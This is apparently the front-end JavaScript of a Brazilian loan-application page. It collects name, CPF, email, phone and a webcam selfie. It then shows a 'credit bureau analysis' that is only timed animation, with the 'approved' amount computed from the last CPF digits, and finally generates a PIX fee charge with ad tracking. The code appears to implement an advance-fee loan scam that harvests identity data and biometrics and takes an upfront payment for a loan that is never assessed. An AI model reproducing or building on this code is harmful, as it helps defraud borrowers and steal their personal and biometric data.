(function () {
  const V = window.FYValidate;
  const API = window.FYApi;
  const state = {
    step: 1,
    stream: null,
    photo: localStorage.getItem('nbk_captured_photo') || '',
    amount: Number(localStorage.getItem('approvedAmount') || 0) || 12000,
    months: Number(localStorage.getItem('selectedInstallments') || 24),
    pix: null,
    timer: null,
    poll: null
  };

  const STEPS = ['Dados', 'Identidade', 'Análise', 'Proposta', 'Pagamento'];

  function $(id) { return document.getElementById(id); }
  function money(n) {
    return Number(n).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  }
  function installment(amount, months, rate) {
    const i = rate;
    return amount * (i * Math.pow(1 + i, months)) / (Math.pow(1 + i, months) - 1);
  }

  function setBtn(btn, loading, label) {
    if (!btn) return;
    btn.disabled = !!loading;
    btn.classList.toggle('loading', !!loading);
    if (label) btn.textContent = label;
  }

  function renderStepper() {
    $('stepper').innerHTML = STEPS.map((name, i) => {
      const n = i + 1;
      const cls = n === state.step ? 'on' : (n < state.step ? 'done' : '');
      return `<div class="step-dot ${cls}"><b></b>${name}</div>`;
    }).join('');
  }

  function show(id) {
    document.querySelectorAll('[data-step]').forEach((el) => el.classList.add('hidden'));
    $(id).classList.remove('hidden');
    renderStepper();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function approvedFromCpf(cpf) {
    const seed = Number(String(cpf).replace(/\D/g, '').slice(-4)) || 1200;
    const raw = 7000 + (seed % 27) * 500;
    return Math.min(20000, Math.max(5000, raw));
  }

  function bindMasks() {
    $('cpf').addEventListener('input', () => { $('cpf').value = V.maskCpf($cpf().value); checkStep1(); });
    $('phone').addEventListener('input', () => { $('phone').value = V.maskPhone($('phone').value); checkStep1(); });
    $('nome').addEventListener('input', checkStep1);
    $('email').addEventListener('input', checkStep1);
  }
  function $cpf() { return $('cpf'); }

  function checkStep1() {
    const cpfOk = V.validCpf($('cpf').value);
    const nameOk = V.validName($('nome').value);
    const emailOk = V.validEmail($('email').value);
    const phoneOk = V.validPhone($('phone').value);
    $('cpfHint').textContent = $('cpf').value && !cpfOk ? 'CPF inválido' : (cpfOk ? 'CPF validado' : 'Usamos criptografia em trânsito');
    $('cpfHint').className = 'hint ' + (cpfOk ? 'ok' : ($('cpf').value ? 'bad' : ''));
    $('emailHint').textContent = $('email').value && !emailOk ? 'E-mail inválido' : '';
    $('emailHint').className = 'hint ' + ($('email').value && !emailOk ? 'bad' : '');
    $('step1Btn').disabled = !(cpfOk && nameOk && emailOk && phoneOk);
    $('cpf').classList.toggle('bad', $('cpf').value && !cpfOk);
    $('email').classList.toggle('bad', $('email').value && !emailOk);
  }

  async function submitStep1(e) {
    e.preventDefault();
    const btn = $('step1Btn');
    setBtn(btn, true, 'Validando dados...');
    try {
      const fields = {
        nome: $('nome').value.trim(),
        cpf: V.digits($('cpf').value),
        email: $('email').value.trim().toLowerCase(),
        telefone: V.digits($('phone').value),
        telephone: V.digits($('phone').value)
      };
      localStorage.setItem('document', fields.cpf);
      await API.saveLead('/credito#dados', fields);
      state.amount = approvedFromCpf(fields.cpf);
      localStorage.setItem('approvedAmount', String(state.amount));
      state.step = 2;
      show('step2');
      startCamera();
    } catch (err) {
      $('step1Err').textContent = err.message;
      $('step1Err').classList.remove('hidden');
    } finally {
      setBtn(btn, false, 'Continuar com segurança');
    }
  }

  async function startCamera() {
    stopCamera();
    const video = $('cam');
    try {
      state.stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });
      video.srcObject = state.stream;
      await video.play();
      $('camHint').textContent = 'Posicione seu rosto no círculo e mantenha o ambiente iluminado.';
    } catch (err) {
      $('camHint').textContent = 'Não foi possível abrir a câmera. Envie uma selfie pelo botão abaixo.';
      const wrap = document.getElementById('fileSelfieWrap');
      if (wrap) wrap.classList.remove('hidden');
    }
  }

  function stopCamera() {
    if (state.stream) state.stream.getTracks().forEach((t) => t.stop());
    state.stream = null;
  }

  function capture() {
    const video = $('cam');
    if (!state.stream || !video.videoWidth) return;
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);
    preview(canvas.toDataURL('image/jpeg', 0.9));
  }

  function preview(dataUrl) {
    state.photo = dataUrl;
    $('selfiePreview').src = dataUrl;
    $('selfiePreview').classList.remove('hidden');
    $('cam').classList.add('hidden');
    $('captureRow').classList.add('hidden');
    $('confirmRow').classList.remove('hidden');
  }

  function retake() {
    state.photo = '';
    $('selfiePreview').classList.add('hidden');
    $('cam').classList.remove('hidden');
    $('captureRow').classList.remove('hidden');
    $('confirmRow').classList.add('hidden');
    startCamera();
  }

  async function confirmSelfie() {
    const btn = $('confirmSelfie');
    setBtn(btn, true, 'Enviando biometria...');
    try {
      await API.savePhoto(state.photo);
      await API.saveLead('/credito#identidade', { nome: localStorage.getItem('nome') });
      stopCamera();
      state.step = 3;
      show('step3');
      runAnalysis();
    } catch (err) {
      $('step2Err').textContent = err.message;
      $('step2Err').classList.remove('hidden');
    } finally {
      setBtn(btn, false, 'Usar esta foto');
    }
  }

  function runAnalysis() {
    const stages = [
      'Consultando Bureau de Crédito...',
      'Verificando score e restrições...',
      'Analisando capacidade de pagamento...',
      'Montando a melhor proposta...'
    ];
    let i = 0;
    const bar = $('analyzeBar');
    const title = $('analyzeTitle');
    const checks = document.querySelectorAll('#analyzeChecks .check');
    const tick = () => {
      const pct = Math.min(100, (i + 1) / stages.length * 100);
      bar.style.width = pct + '%';
      title.textContent = stages[i];
      if (checks[i]) checks[i].classList.add('on');
      i += 1;
      if (i < stages.length) setTimeout(tick, 1700);
      else setTimeout(() => {
        state.step = 4;
        renderProposal();
        show('step4');
      }, 900);
    };
    tick();
  }

  function renderProposal() {
    const months = state.months;
    const amount = state.amount;
    const parcela = installment(amount, months, 0.0149);
    $('loanAmt').textContent = money(amount);
    $('loanParcel').textContent = money(parcela);
    $('loanMonths').textContent = months + 'x';
    $('loanTotal').textContent = money(parcela * months);
    localStorage.setItem('selectedLoanAmount', String(amount));
    localStorage.setItem('selectedInstallments', String(months));
    localStorage.setItem('selectedMonthlyPayment', String(Math.round(parcela * 100) / 100));
    document.querySelectorAll('.pill').forEach((p) => {
      p.classList.toggle('on', Number(p.dataset.m) === months);
    });
    API.saveLead('/credito#proposta', {
      selectedLoanAmount: amount,
      selectedInstallments: months,
      selectedMonthlyPayment: Math.round(parcela * 100) / 100
    }).catch(() => {});
  }

  async function acceptProposal() {
    const btn = $('acceptBtn');
    setBtn(btn, true, 'Gerando cobrança segura...');
    $('pixErr').classList.add('hidden');
    try {
      const charge = await API.createPix({
        name: localStorage.getItem('nome'),
        email: localStorage.getItem('email'),
        cpf: localStorage.getItem('cpf') || localStorage.getItem('document'),
        phone: localStorage.getItem('telefone') || localStorage.getItem('telephone')
      });
      state.pix = charge;
      localStorage.setItem('pix_pending', JSON.stringify({ id: charge.transactionId, ts: Date.now() }));
      state.step = 5;
      show('step5');
      drawQr(charge.qrCode);
      $('pixCode').textContent = charge.qrCode || '';
      $('pixValue').textContent = money((charge.amount || 4863) / 100);
      startTimer(15 * 60);
      startPoll(charge.transactionId);
      try { if (window.ttq) ttq.track('InitiateCheckout', { value: (charge.amount || 4863) / 100, currency: 'BRL' }); } catch (e) {}
    } catch (err) {
      $('propErr').textContent = err.message;
      $('propErr').classList.remove('hidden');
    } finally {
      setBtn(btn, false, 'Contratar e gerar PIX');
    }
  }

  function drawQr(text) {
    const el = $('qrcode');
    el.innerHTML = '';
    if (!text || !window.QRCode) return;
    new QRCode(el, { text, width: 200, height: 200, correctLevel: QRCode.CorrectLevel.M });
  }

  function startTimer(seconds) {
    clearInterval(state.timer);
    let left = seconds;
    const tick = () => {
      const m = String(Math.floor(left / 60)).padStart(2, '0');
      const s = String(left % 60).padStart(2, '0');
      $('pixTimer').textContent = m + ':' + s;
      if (left <= 0) {
        clearInterval(state.timer);
        $('pixErr').textContent = 'Este código expirou. Gere um novo PIX para continuar.';
        $('pixErr').classList.remove('hidden');
      }
      left -= 1;
    };
    tick();
    state.timer = setInterval(tick, 1000);
  }

  function startPoll(id) {
    clearInterval(state.poll);
    state.poll = setInterval(async () => {
      try {
        const data = await API.pixStatus(id);
        if (data.status === 'approved' || data.status === 'paid') {
          clearInterval(state.poll);
          clearInterval(state.timer);
          $('paidView').classList.remove('hidden');
          $('pixLive').classList.add('hidden');
          try { if (window.ttq) ttq.track('CompletePayment', { value: (data.amount || 4863) / 100, currency: 'BRL' }); } catch (e) {}
        }
      } catch (e) {}
    }, 4000);
  }

  async function copyPix() {
    const code = $('pixCode').textContent;
    try {
      await navigator.clipboard.writeText(code);
      $('copyBtn').textContent = 'Código copiado';
      setTimeout(() => { $('copyBtn').textContent = 'Copiar código PIX'; }, 1600);
    } catch (e) {
      $('pixErr').textContent = 'Não foi possível copiar. Selecione o código manualmente.';
      $('pixErr').classList.remove('hidden');
    }
  }

  function prefills() {
    const p = new URLSearchParams(location.search);
    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_id', 'utm_content', 'utm_term', 'sck', 'ttclid'].forEach((k) => {
      const v = p.get(k);
      if (v) localStorage.setItem(k, v);
    });
    if (localStorage.getItem('nome')) $('nome').value = localStorage.getItem('nome');
    if (localStorage.getItem('cpf')) $('cpf').value = V.maskCpf(localStorage.getItem('cpf'));
    if (localStorage.getItem('email')) $('email').value = localStorage.getItem('email');
    if (localStorage.getItem('telefone') || localStorage.getItem('telephone')) {
      $('phone').value = V.maskPhone(localStorage.getItem('telefone') || localStorage.getItem('telephone'));
    }
    checkStep1();
  }

  document.addEventListener('DOMContentLoaded', () => {
    bindMasks();
    prefills();
    $('step1Form').addEventListener('submit', submitStep1);
    $('captureBtn').addEventListener('click', capture);
    $('retakeBtn').addEventListener('click', retake);
    $('confirmSelfie').addEventListener('click', confirmSelfie);
    $('fileSelfie').addEventListener('change', (e) => {
      const file = e.target.files && e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = () => preview(reader.result);
      reader.readAsDataURL(file);
    });
    document.querySelectorAll('.pill').forEach((p) => {
      p.addEventListener('click', () => {
        state.months = Number(p.dataset.m);
        renderProposal();
      });
    });
    $('acceptBtn').addEventListener('click', acceptProposal);
    $('copyBtn').addEventListener('click', copyPix);
    show('step1');
  });

  window.addEventListener('pagehide', stopCamera);
})();
